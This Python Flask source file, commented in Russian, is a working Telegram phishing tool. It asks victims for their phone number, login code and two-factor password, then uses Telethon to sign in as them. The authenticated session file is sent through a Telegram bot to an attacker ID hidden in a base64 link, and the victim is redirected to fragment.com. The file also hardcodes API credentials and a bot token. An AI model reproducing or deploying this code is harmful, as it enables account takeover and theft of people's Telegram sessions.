import os
import base64
import uuid
import requests
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-key-change-me')

API_ID = int(os.environ.get('API_ID', 35766888))
API_HASH = os.environ.get('API_HASH', '9f570c8b35f29ac4b6f0f72805195976')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8222821127:AAEE-jlLDXQ9XOgT5ni1DbRC0eSd06KIKZU')

if not API_ID or not API_HASH:
    raise ValueError("API_ID and API_HASH must be set in environment variables")

# ---- Вспомогательные функции для работы с Telethon (синхронные) ----
def create_client(session_name):
    """Создаёт и подключает клиента Telethon (синхронно)"""
    client = TelegramClient(session_name, API_ID, API_HASH)
    client.connect()
    return client

def send_code_request(phone, client):
    """Отправляет код подтверждения, возвращает phone_code_hash"""
    result = client.send_code_request(phone)
    return result.phone_code_hash

def sign_in_with_code(phone, code, phone_code_hash, client):
    """Пытается войти с кодом. Возвращает (успех, нужен_пароль, сообщение_об_ошибке)"""
    try:
        client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        return True, False, None
    except SessionPasswordNeededError:
        return True, True, None
    except PhoneCodeInvalidError:
        return False, False, "Неверный код. Попробуйте снова."
    except FloodWaitError as e:
        return False, False, f"Слишком много попыток. Подождите {e.seconds} секунд."
    except Exception as e:
        return False, False, str(e)

def sign_in_with_password(password, client):
    """Вход с паролем 2FA. Возвращает (успех, сообщение_об_ошибке)"""
    try:
        client.sign_in(password=password)
        return True, None
    except Exception as e:
        return False, str(e)

def disconnect_client(client):
    """Отключает клиента (сохраняет сессию)"""
    client.disconnect()

# ---- Отправка файла сессии через бота ----
def send_session_file(session_name, target_user_id):
    """Отправляет файл .session указанному пользователю через бота"""
    file_path = f"{session_name}.session"
    if not os.path.exists(file_path):
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': target_user_id}
        response = requests.post(url, files=files, data=data)
    os.remove(file_path)
    return response.ok

# ---- Маршруты ----
@app.route('/<base64_id>')
def index(base64_id):
    """Страница ввода номера телефона"""
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())  # уникальный ID для сессии браузера
    return render_template('index.html', base64_id=base64_id)

@app.route('/<base64_id>/send_code', methods=['POST'])
def send_code(base64_id):
    """Обработка номера, отправка кода"""
    if 'session_id' not in session:
        return redirect(url_for('index', base64_id=base64_id))

    country_code = request.form.get('country_code')
    phone_number = request.form.get('phone_number')
    if not country_code or not phone_number:
        flash("Введите номер телефона")
        return redirect(url_for('index', base64_id=base64_id))

    full_phone = '+' + country_code + phone_number
    session_name = f"session_{session['session_id']}"

    try:
        client = create_client(session_name)
        phone_code_hash = send_code_request(full_phone, client)
        # После отправки кода клиент можно отключить (состояние сохранится в .session)
        disconnect_client(client)

        session['phone'] = full_phone
        session['phone_code_hash'] = phone_code_hash
        session.pop('need_password', None)  # сбрасываем флаг пароля

        return redirect(url_for('verify_code', base64_id=base64_id))
    except Exception as e:
        flash(f"Ошибка при отправке кода: {e}")
        return redirect(url_for('index', base64_id=base64_id))

@app.route('/<base64_id>/verify_code', methods=['GET', 'POST'])
def verify_code(base64_id):
    """Страница ввода кода"""
    if 'session_id' not in session or 'phone' not in session:
        return redirect(url_for('index', base64_id=base64_id))

    if request.method == 'GET':
        return render_template('code.html', base64_id=base64_id)

    # POST: проверка кода
    code = request.form.get('code')
    if not code:
        flash("Введите код")
        return redirect(url_for('verify_code', base64_id=base64_id))

    session_name = f"session_{session['session_id']}"
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']

    try:
        client = create_client(session_name)
        success, need_password, error = sign_in_with_code(phone, code, phone_code_hash, client)

        if error:
            disconnect_client(client)
            flash(error)
            return redirect(url_for('verify_code', base64_id=base64_id))

        if need_password:
            session['need_password'] = True
            disconnect_client(client)  # отключаем, состояние сохранено, но вход не завершён
            return redirect(url_for('password', base64_id=base64_id))

        # Успешный вход без пароля
        disconnect_client(client)  # сохраняем сессию перед отправкой
        return finalize_login(base64_id, session['session_id'])

    except Exception as e:
        flash(f"Ошибка: {e}")
        return redirect(url_for('verify_code', base64_id=base64_id))

@app.route('/<base64_id>/password', methods=['GET', 'POST'])
def password(base64_id):
    """Страница ввода пароля двухфакторки"""
    if 'session_id' not in session or 'need_password' not in session:
        return redirect(url_for('index', base64_id=base64_id))

    if request.method == 'GET':
        return render_template('password.html', base64_id=base64_id)

    # POST: проверка пароля
    password = request.form.get('password')
    if not password:
        flash("Введите пароль")
        return redirect(url_for('password', base64_id=base64_id))

    session_name = f"session_{session['session_id']}"

    try:
        client = create_client(session_name)
        success, error = sign_in_with_password(password, client)

        if not success:
            disconnect_client(client)
            flash(f"Ошибка пароля: {error}")
            return redirect(url_for('password', base64_id=base64_id))

        # Успешный вход с паролем
        disconnect_client(client)
        return finalize_login(base64_id, session['session_id'])

    except Exception as e:
        flash(f"Ошибка: {e}")
        return redirect(url_for('password', base64_id=base64_id))

def finalize_login(base64_id, session_id):
    """Завершение входа: отправка файла и редирект"""
    # Декодируем base64_id в числовой ID пользователя
    try:
        target_user_id = int(base64.b64decode(base64_id).decode())
    except Exception:
        flash("Неверная ссылка")
        return redirect(url_for('index', base64_id=base64_id))

    session_name = f"session_{session_id}"

    # Отправляем файл сессии ботом
    if not send_session_file(session_name, target_user_id):
        flash("Не удалось отправить файл сессии, но вход выполнен.")

    # Очищаем сессию Flask
    session.clear()

    # Редирект на fragment.com
    return redirect("https://fragment.com")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
